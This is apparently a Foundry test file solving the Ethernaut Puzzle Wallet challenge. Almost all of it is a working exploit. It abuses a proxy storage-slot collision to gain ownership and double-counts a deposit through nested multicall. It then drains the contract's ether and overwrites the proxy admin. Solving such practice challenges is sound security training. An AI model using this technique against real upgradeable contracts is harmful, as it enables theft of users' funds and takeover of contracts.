// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/contracts/24_PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    address private owner = makeAddr("owner");
    address private attacker = makeAddr("attacker");
    PuzzleProxy private puzzleProxy;
    PuzzleWallet private puzzleWallet;

    function setUp() public {
        vm.startPrank(owner);
        puzzleWallet = new PuzzleWallet();

        puzzleProxy = new PuzzleProxy(owner, address(puzzleWallet), "");
        vm.stopPrank();

        deal(address(puzzleProxy), 0.001 ether);
    }

    function test_PuzzleWalletExploitVulnerability() public {
        vm.startPrank(attacker);
        deal(attacker, 0.001 ether);

        puzzleProxy.proposeNewAdmin(attacker);

        bytes memory addToWhitelist = abi.encodeWithSelector(
            puzzleWallet.addToWhitelist.selector,
            uint256(uint160(attacker))
        );

        address(puzzleProxy).call(addToWhitelist);

        bytes[] memory callsDeep = new bytes[](1);
        callsDeep[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(
            puzzleWallet.multicall.selector,
            callsDeep
        );

        bytes memory multicall = abi.encodeWithSelector(
            puzzleWallet.multicall.selector,
            calls
        );

        address(puzzleProxy).call{value: 0.001 ether}(multicall);

        bytes memory execute = abi.encodeWithSelector(
            puzzleWallet.execute.selector,
            attacker,
            0.002 ether,
            ""
        );

        address(puzzleProxy).call(execute);

        bytes memory setMaxBalance = abi.encodeWithSelector(
            puzzleWallet.setMaxBalance.selector,
            uint256(uint160(attacker))
        );

        address(puzzleProxy).call(setMaxBalance);

        vm.stopPrank();

        assertEq(puzzleProxy.admin(), attacker);
        assertEq(attacker.balance, 0.002 ether);
        assertEq(address(puzzleProxy).balance, 0);
    }
}
